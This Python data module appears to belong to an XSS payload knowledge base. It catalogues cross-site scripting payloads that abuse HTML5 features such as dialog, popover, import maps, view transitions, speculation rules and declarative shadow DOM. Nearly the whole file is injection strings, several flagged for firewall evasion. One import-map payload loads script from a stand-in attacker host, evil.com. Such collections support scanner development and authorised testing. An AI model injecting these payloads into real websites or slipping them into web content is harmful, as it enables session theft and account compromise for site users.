#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Active
Telegram: https://t.me/EasyProTech

HTML5 Modern APIs XSS Payloads
Dialog, Popover, Import Maps, View Transitions, Speculation Rules, etc.
"""

from ..models import Encoding, PayloadEntry, Reliability, Severity


# === Dialog Element Payloads ===
HTML5_DIALOG_PAYLOADS = {
    "dialog-show-xss": PayloadEntry(
        payload='<dialog id="d" open><img src=x onerror=alert(1)></dialog>',
        contexts=["html5_dialog", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="HTML5 dialog element with auto-open XSS",
        tags=["html5", "dialog", "open", "auto"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "dialog-showModal-onfocus": PayloadEntry(
        payload='<dialog id="d"><input onfocus=alert(1) autofocus></dialog><script>d.showModal()</script>',
        contexts=["html5_dialog", "html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Dialog showModal with autofocus XSS",
        tags=["html5", "dialog", "showModal", "autofocus"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "dialog-close-event": PayloadEntry(
        payload='<dialog id="d" onclose=alert(1) open></dialog><script>d.close()</script>',
        contexts=["html5_dialog", "html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Dialog close event handler",
        tags=["html5", "dialog", "onclose", "event"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "dialog-cancel-event": PayloadEntry(
        payload='<dialog id="d" oncancel=alert(1) open></dialog>',
        contexts=["html5_dialog", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=6.0,
        description="Dialog cancel event (ESC key)",
        tags=["html5", "dialog", "oncancel", "escape"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Popover API Payloads ===
HTML5_POPOVER_PAYLOADS = {
    "popover-auto-xss": PayloadEntry(
        payload='<div popover id="p"><img src=x onerror=alert(1)></div><button popovertarget="p">Show</button>',
        contexts=["html5_popover", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Popover API with XSS content",
        tags=["html5", "popover", "popovertarget"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "popover-toggle-event": PayloadEntry(
        payload='<div popover id="p" ontoggle=alert(1)>XSS</div><button popovertarget="p">Show</button>',
        contexts=["html5_popover", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Popover ontoggle event handler",
        tags=["html5", "popover", "ontoggle", "event"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "popover-beforetoggle": PayloadEntry(
        payload='<div popover id="p" onbeforetoggle=alert(1)>XSS</div><button popovertarget="p">Show</button>',
        contexts=["html5_popover", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Popover onbeforetoggle event",
        tags=["html5", "popover", "onbeforetoggle", "event"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "popover-manual-show": PayloadEntry(
        payload='<div popover=manual id="p"><script>alert(1)</script></div><script>p.showPopover()</script>',
        contexts=["html5_popover", "html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Manual popover with script injection",
        tags=["html5", "popover", "manual", "script"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Import Maps Payloads ===
HTML5_IMPORT_MAP_PAYLOADS = {
    "importmap-redirect": PayloadEntry(
        payload='<script type="importmap">{"imports":{"lodash":"data:text/javascript,alert(1)"}}</script><script type="module">import _ from "lodash"</script>',
        contexts=["html5_import_map", "html_content", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Import map module redirection to data URL",
        tags=["html5", "importmap", "module", "redirect"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "importmap-override": PayloadEntry(
        payload='<script type="importmap">{"imports":{"react":"https://evil.com/xss.js"}}</script>',
        contexts=["html5_import_map", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Import map library override",
        tags=["html5", "importmap", "override", "library"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "importmap-scopes": PayloadEntry(
        payload='<script type="importmap">{"scopes":{"/admin/":{"utils":"data:text/javascript,alert(1)"}}}</script>',
        contexts=["html5_import_map", "html_content"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="Import map scoped override",
        tags=["html5", "importmap", "scopes", "path"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === View Transitions API Payloads ===
HTML5_VIEW_TRANSITIONS_PAYLOADS = {
    "view-transition-callback": PayloadEntry(
        payload="document.startViewTransition(() => { alert(1); return new Promise(() => {}) })",
        contexts=["html5_view_transitions", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="View Transitions callback execution",
        tags=["html5", "view-transitions", "callback"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "view-transition-css-animation": PayloadEntry(
        payload="<style>::view-transition-old(root){animation:xss 1s}@keyframes xss{from{background:url(javascript:alert(1))}}</style>",
        contexts=["html5_view_transitions", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="View transition CSS animation injection",
        tags=["html5", "view-transitions", "css", "animation"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "view-transition-name": PayloadEntry(
        payload='<div style="view-transition-name: --xss"><img src=x onerror=alert(1)></div>',
        contexts=["html5_view_transitions", "html_content", "css"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="View transition named element XSS",
        tags=["html5", "view-transitions", "named", "style"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Speculation Rules Payloads ===
HTML5_SPECULATION_RULES_PAYLOADS = {
    "speculation-prerender": PayloadEntry(
        payload='<script type="speculationrules">{"prerender":[{"source":"list","urls":["javascript:alert(1)"]}]}</script>',
        contexts=["html5_speculation_rules", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Speculation rules prerender with JS URL",
        tags=["html5", "speculation", "prerender", "url"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "speculation-prefetch": PayloadEntry(
        payload='<script type="speculationrules">{"prefetch":[{"source":"document","where":{"href_matches":"/*"}}]}</script>',
        contexts=["html5_speculation_rules", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Speculation rules document prefetch",
        tags=["html5", "speculation", "prefetch", "document"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Selectmenu/Selectlist Payloads ===
HTML5_SELECTMENU_PAYLOADS = {
    "selectmenu-slot-xss": PayloadEntry(
        payload='<selectmenu><button slot="button" onclick=alert(1)>XSS</button></selectmenu>',
        contexts=["html5_selectmenu", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Selectmenu custom button slot XSS",
        tags=["html5", "selectmenu", "slot", "button"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "selectmenu-option-xss": PayloadEntry(
        payload="<selectmenu><option><img src=x onerror=alert(1)></option></selectmenu>",
        contexts=["html5_selectmenu", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Selectmenu option content XSS",
        tags=["html5", "selectmenu", "option", "content"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Declarative Shadow DOM Payloads ===
HTML5_DECLARATIVE_SHADOW_DOM_PAYLOADS = {
    "declarative-shadow-xss": PayloadEntry(
        payload='<div><template shadowrootmode="open"><img src=x onerror=alert(1)></template></div>',
        contexts=["html5_declarative_shadow_dom", "html_content", "shadow_dom"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Declarative Shadow DOM with XSS",
        tags=["html5", "shadow-dom", "declarative", "template"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "declarative-shadow-script": PayloadEntry(
        payload='<div><template shadowrootmode="open"><script>alert(1)</script></template></div>',
        contexts=["html5_declarative_shadow_dom", "html_content", "shadow_dom"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Declarative Shadow DOM script execution",
        tags=["html5", "shadow-dom", "declarative", "script"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "declarative-shadow-closed": PayloadEntry(
        payload='<div><template shadowrootmode="closed"><style>@import url("javascript:alert(1)")</style></template></div>',
        contexts=["html5_declarative_shadow_dom", "html_content", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Closed shadow root with CSS injection",
        tags=["html5", "shadow-dom", "closed", "css"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# Combined database
HTML5_MODERN_APIS_PAYLOADS = {
    **HTML5_DIALOG_PAYLOADS,
    **HTML5_POPOVER_PAYLOADS,
    **HTML5_IMPORT_MAP_PAYLOADS,
    **HTML5_VIEW_TRANSITIONS_PAYLOADS,
    **HTML5_SPECULATION_RULES_PAYLOADS,
    **HTML5_SELECTMENU_PAYLOADS,
    **HTML5_DECLARATIVE_SHADOW_DOM_PAYLOADS,
}

HTML5_MODERN_APIS_TOTAL = len(HTML5_MODERN_APIS_PAYLOADS)
